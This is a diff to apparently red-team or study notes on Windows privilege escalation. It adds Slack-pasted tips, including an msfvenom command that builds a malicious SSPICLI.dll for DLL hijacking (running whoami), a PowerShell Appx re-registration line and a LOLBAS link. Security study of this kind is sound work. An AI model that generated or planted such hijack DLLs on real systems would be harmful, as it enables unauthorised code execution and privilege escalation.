@@ -219,6 +219,30 @@ PART TWO: Create C source File and compile into DLL
 ```
 
 
+# SGT WILSON's C SOURCE FILE STUFF FROM SLACK
+
+```
+
+Sgt Wilson, Rocky  11:09 AM
+msfvenom -p windows/exec CMD="cmd /C whoami > C:\\findme.txt" -f dll > SSPICLI.dll
+(edited)
+
+
+Sgt Wilson, Rocky  11:22 AM
+If you don't want to do the compilation over and over.
+
+
+Sgt Wilson, Rocky  11:28 AM
+Get-AppxPackage -AllUsers| Foreach {Add-AppxPackage -DisableDevelopmentMode -Register "$($_.InstallLocation)\AppXManifest.xml"}
+```
+
+
+##### LOLBAS WEBSITE
+
+[lolbas](https://lolbas-project.github.io/)
+
+
+
 
 ## 2. Services
 - Binary Replacement
